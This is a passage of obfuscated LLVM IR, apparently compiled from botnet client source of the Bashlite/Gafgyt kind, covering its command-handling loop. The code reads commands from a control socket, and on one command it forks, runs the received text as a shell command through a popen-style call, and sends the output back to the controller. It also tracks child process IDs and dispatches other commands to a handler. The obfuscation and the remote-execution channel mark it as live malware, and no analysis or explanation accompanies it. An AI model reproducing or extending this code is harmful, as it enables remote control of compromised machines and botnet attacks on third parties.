  %254 = sub i32 %253, 1
  %255 = sub i32 %254, 1815277067
  %256 = sub i32 %252, 1
  %257 = zext i32 %255 to i64
  %258 = getelementptr inbounds i32, i32* %251, i64 %257
  store i32 %250, i32* %258, align 4
  br label %259

; <label>:259:                                    ; preds = %245
  %260 = load i32, i32* %23, align 4
  %261 = sub i32 %260, 31663645
  %262 = add i32 %261, 1
  %263 = add i32 %262, 31663645
  %264 = add i32 %260, 1
  store i32 %263, i32* %23, align 4
  br label %240

; <label>:265:                                    ; preds = %240
  %266 = load i32*, i32** @pids, align 8
  %267 = load i32, i32* %23, align 4
  %268 = add i32 %267, -2046200703
  %269 = sub i32 %268, 1
  %270 = sub i32 %269, -2046200703
  %271 = sub i32 %267, 1
  %272 = zext i32 %270 to i64
  %273 = getelementptr inbounds i32, i32* %266, i64 %272
  store i32 0, i32* %273, align 4
  %274 = load i64, i64* @numpids, align 8
  %275 = sub i64 %274, -8898689751094582212
  %276 = add i64 %275, -1
  %277 = add i64 %276, -8898689751094582212
  %278 = add i64 %274, -1
  store i64 %277, i64* @numpids, align 8
  %279 = load i64, i64* @numpids, align 8
  %280 = add i64 %279, 2606988887821494097
  %281 = add i64 %280, 1
  %282 = sub i64 %281, 2606988887821494097
  %283 = add i64 %279, 1
  %284 = mul i64 %282, 4
  %285 = call noalias i8* @malloc(i64 %284) #2
  %286 = bitcast i8* %285 to i32*
  store i32* %286, i32** %22, align 8
  store i32 0, i32* %23, align 4
  br label %287

; <label>:287:                                    ; preds = %302, %265
  %288 = load i32, i32* %23, align 4
  %289 = zext i32 %288 to i64
  %290 = load i64, i64* @numpids, align 8
  %291 = icmp ult i64 %289, %290
  br i1 %291, label %292, label %308

; <label>:292:                                    ; preds = %287
  %293 = load i32*, i32** @pids, align 8
  %294 = load i32, i32* %23, align 4
  %295 = zext i32 %294 to i64
  %296 = getelementptr inbounds i32, i32* %293, i64 %295
  %297 = load i32, i32* %296, align 4
  %298 = load i32*, i32** %22, align 8
  %299 = load i32, i32* %23, align 4
  %300 = zext i32 %299 to i64
  %301 = getelementptr inbounds i32, i32* %298, i64 %300
  store i32 %297, i32* %301, align 4
  br label %302

; <label>:302:                                    ; preds = %292
  %303 = load i32, i32* %23, align 4
  %304 = add i32 %303, 1362162543
  %305 = add i32 %304, 1
  %306 = sub i32 %305, 1362162543
  %307 = add i32 %303, 1
  store i32 %306, i32* %23, align 4
  br label %287

; <label>:308:                                    ; preds = %287
  %309 = load i32*, i32** @pids, align 8
  %310 = bitcast i32* %309 to i8*
  call void @free(i8* %310) #2
  %311 = load i32*, i32** %22, align 8
  store i32* %311, i32** @pids, align 8
  br label %312

; <label>:312:                                    ; preds = %308, %225
  br label %313

; <label>:313:                                    ; preds = %312
  %314 = load i32, i32* %21, align 4
  %315 = sub i32 0, 1
  %316 = sub i32 %314, %315
  %317 = add nsw i32 %314, 1
  store i32 %316, i32* %21, align 4
  br label %220

; <label>:318:                                    ; preds = %220
  %319 = load i32, i32* %20, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %320
  store i8 0, i8* %321, align 1
  %322 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %322)
  %323 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %324 = call i8* @strstr(i8* %323, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i32 0, i32 0)) #10
  %325 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %326 = icmp eq i8* %324, %325
  br i1 %326, label %327, label %330

; <label>:327:                                    ; preds = %318
  %328 = load i32, i32* @mainCommSock, align 4
  %329 = call i32 (i32, i8*, ...) @sockprintf(i32 %328, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0))
  br label %214

; <label>:330:                                    ; preds = %318
  %331 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %331, i8** %24, align 8
  %332 = load i8*, i8** %24, align 8
  %333 = load i8, i8* %332, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 33
  br i1 %335, label %336, label %537

; <label>:336:                                    ; preds = %330
  %337 = load i8*, i8** %24, align 8
  %338 = getelementptr inbounds i8, i8* %337, i64 1
  store i8* %338, i8** %25, align 8
  br label %339

; <label>:339:                                    ; preds = %351, %336
  %340 = load i8*, i8** %25, align 8
  %341 = load i8, i8* %340, align 1
  %342 = zext i8 %341 to i32
  %343 = icmp ne i32 %342, 32
  br i1 %343, label %344, label %349

; <label>:344:                                    ; preds = %339
  %345 = load i8*, i8** %25, align 8
  %346 = load i8, i8* %345, align 1
  %347 = zext i8 %346 to i32
  %348 = icmp ne i32 %347, 0
  br label %349

; <label>:349:                                    ; preds = %344, %339
  %350 = phi i1 [ false, %339 ], [ %348, %344 ]
  br i1 %350, label %351, label %354

; <label>:351:                                    ; preds = %349
  %352 = load i8*, i8** %25, align 8
  %353 = getelementptr inbounds i8, i8* %352, i32 1
  store i8* %353, i8** %25, align 8
  br label %339

; <label>:354:                                    ; preds = %349
  %355 = load i8*, i8** %25, align 8
  %356 = load i8, i8* %355, align 1
  %357 = zext i8 %356 to i32
  %358 = icmp eq i32 %357, 0
  br i1 %358, label %359, label %360

; <label>:359:                                    ; preds = %354
  br label %214

; <label>:360:                                    ; preds = %354
  %361 = load i8*, i8** %25, align 8
  store i8 0, i8* %361, align 1
  %362 = load i8*, i8** %24, align 8
  %363 = getelementptr inbounds i8, i8* %362, i64 1
  store i8* %363, i8** %25, align 8
  %364 = load i8*, i8** %24, align 8
  %365 = load i8*, i8** %25, align 8
  %366 = call i64 @strlen(i8* %365) #10
  %367 = getelementptr inbounds i8, i8* %364, i64 %366
  %368 = getelementptr inbounds i8, i8* %367, i64 2
  store i8* %368, i8** %24, align 8
  br label %369

; <label>:369:                                    ; preds = %394, %360
  %370 = load i8*, i8** %24, align 8
  %371 = load i8*, i8** %24, align 8
  %372 = call i64 @strlen(i8* %371) #10
  %373 = sub i64 0, 1
  %374 = add i64 %372, %373
  %375 = sub i64 %372, 1
  %376 = getelementptr inbounds i8, i8* %370, i64 %374
  %377 = load i8, i8* %376, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp eq i32 %378, 10
  br i1 %379, label %392, label %380

; <label>:380:                                    ; preds = %369
  %381 = load i8*, i8** %24, align 8
  %382 = load i8*, i8** %24, align 8
  %383 = call i64 @strlen(i8* %382) #10
  %384 = sub i64 %383, 3323504976061466083
  %385 = sub i64 %384, 1
  %386 = add i64 %385, 3323504976061466083
  %387 = sub i64 %383, 1
  %388 = getelementptr inbounds i8, i8* %381, i64 %386
  %389 = load i8, i8* %388, align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 13
  br label %392

; <label>:392:                                    ; preds = %380, %369
  %393 = phi i1 [ true, %369 ], [ %391, %380 ]
  br i1 %393, label %394, label %402

; <label>:394:                                    ; preds = %392
  %395 = load i8*, i8** %24, align 8
  %396 = load i8*, i8** %24, align 8
  %397 = call i64 @strlen(i8* %396) #10
  %398 = sub i64 0, 1
  %399 = add i64 %397, %398
  %400 = sub i64 %397, 1
  %401 = getelementptr inbounds i8, i8* %395, i64 %399
  store i8 0, i8* %401, align 1
  br label %369

; <label>:402:                                    ; preds = %392
  %403 = load i8*, i8** %24, align 8
  store i8* %403, i8** %26, align 8
  br label %404

; <label>:404:                                    ; preds = %416, %402
  %405 = load i8*, i8** %24, align 8
  %406 = load i8, i8* %405, align 1
  %407 = zext i8 %406 to i32
  %408 = icmp ne i32 %407, 32
  br i1 %408, label %409, label %414

; <label>:409:                                    ; preds = %404
  %410 = load i8*, i8** %24, align 8
  %411 = load i8, i8* %410, align 1
  %412 = zext i8 %411 to i32
  %413 = icmp ne i32 %412, 0
  br label %414

; <label>:414:                                    ; preds = %409, %404
  %415 = phi i1 [ false, %404 ], [ %413, %409 ]
  br i1 %415, label %416, label %419

; <label>:416:                                    ; preds = %414
  %417 = load i8*, i8** %24, align 8
  %418 = getelementptr inbounds i8, i8* %417, i32 1
  store i8* %418, i8** %24, align 8
  br label %404

; <label>:419:                                    ; preds = %414
  %420 = load i8*, i8** %24, align 8
  store i8 0, i8* %420, align 1
  %421 = load i8*, i8** %24, align 8
  %422 = getelementptr inbounds i8, i8* %421, i32 1
  store i8* %422, i8** %24, align 8
  %423 = load i8*, i8** %26, align 8
  store i8* %423, i8** %27, align 8
  br label %424

; <label>:424:                                    ; preds = %428, %419
  %425 = load i8*, i8** %27, align 8
  %426 = load i8, i8* %425, align 1
  %427 = icmp ne i8 %426, 0
  br i1 %427, label %428, label %437

; <label>:428:                                    ; preds = %424
  %429 = load i8*, i8** %27, align 8
  %430 = load i8, i8* %429, align 1
  %431 = zext i8 %430 to i32
  %432 = call i32 @toupper(i32 %431) #10
  %433 = trunc i32 %432 to i8
  %434 = load i8*, i8** %27, align 8
  store i8 %433, i8* %434, align 1
  %435 = load i8*, i8** %27, align 8
  %436 = getelementptr inbounds i8, i8* %435, i32 1
  store i8* %436, i8** %27, align 8
  br label %424

; <label>:437:                                    ; preds = %424
  %438 = load i8*, i8** %26, align 8
  %439 = call i32 @strcmp(i8* %438, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.143, i32 0, i32 0)) #10
  %440 = icmp eq i32 %439, 0
  br i1 %440, label %441, label %467

; <label>:441:                                    ; preds = %437
  %442 = call i32 @listFork()
  %443 = icmp ne i32 %442, 0
  br i1 %443, label %444, label %445

; <label>:444:                                    ; preds = %441
  br label %214

; <label>:445:                                    ; preds = %441
  %446 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %446, i8 0, i64 1024, i32 16, i1 false)
  %447 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %448 = load i8*, i8** %24, align 8
  %449 = call i32 (i8*, i8*, ...) @szprintf(i8* %447, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.144, i32 0, i32 0), i8* %448)
  %450 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %451 = call i32 @fdpopen(i8* %450, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.136, i32 0, i32 0))
  store i32 %451, i32* %29, align 4
  br label %452

; <label>:452:                                    ; preds = %457, %445
  %453 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %454 = load i32, i32* %29, align 4
  %455 = call i8* @fdgets(i8* %453, i32 1024, i32 %454)
  %456 = icmp ne i8* %455, null
  br i1 %456, label %457, label %464

; <label>:457:                                    ; preds = %452
  %458 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %458)
  %459 = load i32, i32* @mainCommSock, align 4
  %460 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %461 = call i32 (i32, i8*, ...) @sockprintf(i32 %459, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.145, i32 0, i32 0), i8* %460)
  %462 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %462, i8 0, i64 1024, i32 16, i1 false)
  %463 = call i32 @sleep(i32 1)
  br label %452

; <label>:464:                                    ; preds = %452
  %465 = load i32, i32* %29, align 4
  %466 = call i32 @fdpclose(i32 %465)
  call void @exit(i32 0) #14
  unreachable

; <label>:467:                                    ; preds = %437
  store i32 1, i32* %31, align 4
  %468 = load i8*, i8** %24, align 8
  %469 = call i8* @strtok(i8* %468, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %469, i8** %32, align 8
  %470 = load i8*, i8** %26, align 8
  %471 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %470, i8** %471, align 16
  br label %472

; <label>:472:                                    ; preds = %512, %467
  %473 = load i8*, i8** %32, align 8
  %474 = icmp ne i8* %473, null
  br i1 %474, label %475, label %514

; <label>:475:                                    ; preds = %472
  %476 = load i8*, i8** %32, align 8
  %477 = load i8, i8* %476, align 1
  %478 = zext i8 %477 to i32
  %479 = icmp ne i32 %478, 10
  br i1 %479, label %480, label %512

; <label>:480:                                    ; preds = %475
  %481 = load i8*, i8** %32, align 8
  %482 = call i64 @strlen(i8* %481) #10
  %483 = sub i64 0, %482
  %484 = sub i64 0, 1
  %485 = add i64 %483, %484
  %486 = sub i64 0, %485
  %487 = add i64 %482, 1
  %488 = call noalias i8* @malloc(i64 %486) #2
  %489 = load i32, i32* %31, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %490
  store i8* %488, i8** %491, align 8
  %492 = load i32, i32* %31, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %493
  %495 = load i8*, i8** %494, align 8
  %496 = load i8*, i8** %32, align 8
  %497 = call i64 @strlen(i8* %496) #10
  %498 = sub i64 0, 1
  %499 = sub i64 %497, %498
  %500 = add i64 %497, 1
  call void @llvm.memset.p0i8.i64(i8* %495, i8 0, i64 %499, i32 1, i1 false)
  %501 = load i32, i32* %31, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %502
  %504 = load i8*, i8** %503, align 8
  %505 = load i8*, i8** %32, align 8
  %506 = call i8* @strcpy(i8* %504, i8* %505) #2
  %507 = load i32, i32* %31, align 4
  %508 = sub i32 %507, 115361701
  %509 = add i32 %508, 1
  %510 = add i32 %509, 115361701
  %511 = add nsw i32 %507, 1
  store i32 %510, i32* %31, align 4
  br label %512

; <label>:512:                                    ; preds = %480, %475
  %513 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.146, i32 0, i32 0)) #2
  store i8* %513, i8** %32, align 8
  br label %472

; <label>:514:                                    ; preds = %472
  %515 = load i32, i32* %31, align 4
  %516 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %515, i8** %516)
  %517 = load i32, i32* %31, align 4
  %518 = icmp sgt i32 %517, 1
  br i1 %518, label %519, label %536

; <label>:519:                                    ; preds = %514
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %520

; <label>:520:                                    ; preds = %529, %519
  %521 = load i32, i32* %33, align 4
  %522 = load i32, i32* %31, align 4
  %523 = icmp slt i32 %521, %522
  br i1 %523, label %524, label %535

; <label>:524:                                    ; preds = %520
  %525 = load i32, i32* %33, align 4
  %526 = sext i32 %525 to i64
  %527 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %526
  %528 = load i8*, i8** %527, align 8
  call void @free(i8* %528) #2
  br label %529

; <label>:529:                                    ; preds = %524
  %530 = load i32, i32* %33, align 4
  %531 = sub i32 %530, -817100581
  %532 = add i32 %531, 1
  %533 = add i32 %532, -817100581
  %534 = add nsw i32 %530, 1
  store i32 %533, i32* %33, align 4
  br label %520

; <label>:535:                                    ; preds = %520
  br label %536

; <label>:536:                                    ; preds = %535, %514
  br label %537

; <label>:537:                                    ; preds = %536, %330
  br label %214

; <label>:538:                                    ; preds = %214
  br label %204
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612692}
!2 = !{i32 -2146611984}
!3 = !{i32 -2146611287}
!4 = !{i32 -2146610396}
!5 = !{i32 -2146609669}
!6 = !{i32 -2146608844}
